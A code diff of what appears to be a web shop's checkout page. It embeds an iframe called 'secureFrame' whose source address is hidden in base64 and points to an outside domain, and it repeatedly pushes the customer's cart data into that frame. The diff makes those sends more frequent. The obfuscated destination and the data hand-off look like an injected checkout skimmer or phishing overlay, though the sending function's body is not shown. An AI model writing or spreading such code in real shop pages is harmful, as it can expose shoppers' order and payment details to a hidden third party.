@@ -958,7 +958,7 @@ font-weight:bold;
 ">
 Enviando pedido...
 </div>
- <section>
+<section>
 
 <iframe 
   id="secureFrame"
@@ -971,7 +971,6 @@ Enviando pedido...
 const iframe = document.getElementById("secureFrame");
 
 const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi84L2FxdWkuaHRtbA==");
-
 iframe.src = realURL;
 
 function enviarCarrito() {
@@ -986,9 +985,14 @@ function enviarCarrito() {
 }
 
 iframe.addEventListener("load", () => {
-  enviarCarrito();
-  setTimeout(enviarCarrito, 300);
-  setTimeout(enviarCarrito, 800);
+  let intentos = 0;
+
+  const intervalo = setInterval(() => {
+    enviarCarrito();
+    intentos++;
+
+    if (intentos > 15) clearInterval(intervalo);
+  }, 300);
 });
 </script>
 
@@ -998,12 +1002,12 @@ window.addEventListener("message", function(event) {
   if (event.origin !== "https://novie.in") return;
 
   if (event.data.type === "altura") {
-    const iframe = document.getElementById("secureFrame");
     iframe.style.height = event.data.height + "px";
   }
 
 });
 </script>
+
 </section>
 
 <!-- FOOTER ORIGINAL -->
